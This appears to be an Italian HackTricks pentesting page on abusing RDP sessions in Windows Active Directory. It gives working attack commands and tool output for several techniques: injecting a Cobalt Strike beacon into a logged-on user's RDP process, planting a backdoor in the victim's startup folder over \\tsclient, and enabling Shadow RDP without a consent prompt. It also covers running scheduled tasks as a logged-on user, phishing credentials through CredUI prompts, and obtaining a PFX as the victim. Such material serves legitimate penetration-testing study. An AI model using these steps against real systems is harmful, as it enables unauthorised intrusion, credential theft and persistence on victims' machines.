# Abuso delle sessioni RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se il **gruppo esterno** dispone dell'**accesso RDP** a un **computer** nel dominio corrente, un attaccante che compromette quel computer può attendere che un membro del gruppo si connetta.

Quando l'utente si connette tramite RDP, l'**attaccante può effettuare un pivot verso la sessione dell'utente** e abusare dei permessi dell'utente nel dominio esterno.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Consulta **altri modi per sottrarre sessioni con altri strumenti** [**in questa pagina.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

Una **sessione console o RDP attiva** appartenente a un altro utente di dominio è un possibile punto di partenza anche quando hai una shell con privilegi inferiori sullo stesso host. L'attivazione DCOM tra sessioni può indurre un server COM adatto, nella sessione interattiva, ad autenticarsi; strumenti come RemotePotato0 o KrbRelay possono catturare o inoltrare tale autenticazione. L'utente connesso non deve necessariamente essere un amministratore di dominio: può bastare un diritto di directory con ambito ristretto, come il permesso di leggere una password gestita gMSA, per effettuare un ulteriore pivot.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Inizia con l'ID e l'identità della sessione ricavati da `query user`, `qwinsta` o dall'inventario delle sessioni esistente di winPEAS. Considerali **candidati**, non prove di un possibile relay. Sono tutti importanti la classe COM, i relativi livelli di impersonazione e autenticazione, l'accessibilità della sessione, il routing firewall/OXID, le protezioni del protocollo di destinazione e i diritti effettivi dell'entità connessa. KrbRelay documenta esempi cross-session per LDAP, HTTP, SMB e NTLM, ma questi percorsi dipendono dalla versione e dalla configurazione. Anche il channel binding LDAP è un'ulteriore barriera contro il relay lato destinazione. In particolare, il progetto RemotePotato0 segnala che lo scenario di exploit originale RPC-to-LDAP è stato corretto nel 2022; non dedurre che il relay LDAP abbia esito positivo solo perché è visibile una sessione.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Se un utente accede tramite **RDP a una macchina** dove un **aggressore** lo sta **aspettando**, l'aggressore potrà **iniettare un beacon nella sessione RDP dell'utente** e, se la **vittima ha montato la propria unità** durante l'accesso tramite RDP, l'**aggressore potrà accedervi**.

In questo caso, potresti semplicemente **compromettere** il **computer originale della vittima** scrivendo una **backdoor** nella **cartella di avvio**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Se sei **local admin** su un host in cui la vittima ha già una **sessione RDP attiva**, potresti riuscire a **visualizzare/controllare quel desktop senza sottrarre la password o eseguire il dump di LSASS**.<sup>[[1]](#references)</sup>

Questo dipende dal criterio di **shadowing di Remote Desktop Services**, memorizzato in:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Valori interessanti:

- `0`: Disabilitato
- `1`: `EnableInputNotify` (controllo, è richiesta l’approvazione dell’utente)
- `2`: `EnableInputNoNotify` (controllo, **non è richiesta l’approvazione dell’utente**)
- `3`: `EnableNoInputNotify` (solo visualizzazione, è richiesta l’approvazione dell’utente)
- `4`: `EnableNoInputNoNotify` (solo visualizzazione, **non è richiesta l’approvazione dell’utente**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Questo è particolarmente utile quando un utente privilegiato connesso tramite RDP ha lasciato aperti un desktop sbloccato, una sessione KeePass, una console MMC, una sessione del browser o una shell di amministrazione.

## Attività pianificate come utente connesso

Se sei **amministratore locale** e l'utente target è **attualmente connesso**, Utilità di pianificazione può avviare codice **come quell'utente senza la sua password**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

In questo modo, la sessione di accesso esistente della vittima diventa una primitiva di esecuzione:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Note:

- Se l'utente **non ha effettuato l'accesso**, Windows di solito richiede la password per creare un'attività che venga eseguita con il suo account.
- Se l'utente **ha effettuato l'accesso**, l'attività può riutilizzare il contesto di accesso esistente.
- È un metodo pratico per eseguire azioni GUI o avviare binari nella sessione della vittima senza toccare LSASS.

## Abuso dei prompt CredUI dalla sessione della vittima

Una volta ottenuta la possibilità di eseguire codice **nel desktop interattivo della vittima** (ad esempio tramite **Shadow RDP** o **un'attività pianificata eseguita con l'account dell'utente**), puoi visualizzare un **vero prompt delle credenziali di Windows** usando le API CredUI e acquisire le credenziali inserite dalla vittima.<sup>[[1]](#references)</sup>

API pertinenti:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flusso tipico:

1. Avviare un binario nella sessione della vittima.
2. Visualizzare un prompt di autenticazione del dominio che corrisponda al branding del dominio corrente.
3. Estrarre i dati dal buffer di autenticazione restituito.
4. Convalidare le credenziali fornite e, facoltativamente, continuare a mostrare il prompt finché non vengono inserite credenziali valide.

È utile per il **phishing on-host**, perché il prompt viene visualizzato tramite le API standard di Windows anziché tramite un falso modulo HTML.

## Richiesta di un PFX nel contesto della vittima

La stessa primitiva **attività pianificata come utente** può essere usata per richiedere un **certificato/PFX come vittima connessa**. In seguito, quel certificato può essere usato per l'**autenticazione AD** come quell'utente, evitando del tutto il furto della password.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Flusso generale:

1. Ottenere i privilegi di **amministratore locale** su un host a cui la vittima ha effettuato l'accesso.
2. Eseguire la logica di enrollment/esportazione come vittima tramite un'**attività pianificata**.
3. Esportare il **PFX** risultante.
4. Usare il PFX per l'autenticazione AD basata su certificato / PKINIT.

Consulta le pagine AD CS per approfondire gli abusi:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - Da reti piatte a domini bloccati con modelli di tiering](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – opzioni shadow-session di `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR #465 del plugin Shadow RDP](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - modulo schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR #908 per richiedere un PFX tramite attività pianificata](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - attivazione DCOM tra sessioni e limitazioni attuali](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - esempi di relay tra sessioni e requisiti CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - comando query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - attributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - LDAP channel binding e protezione dai relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
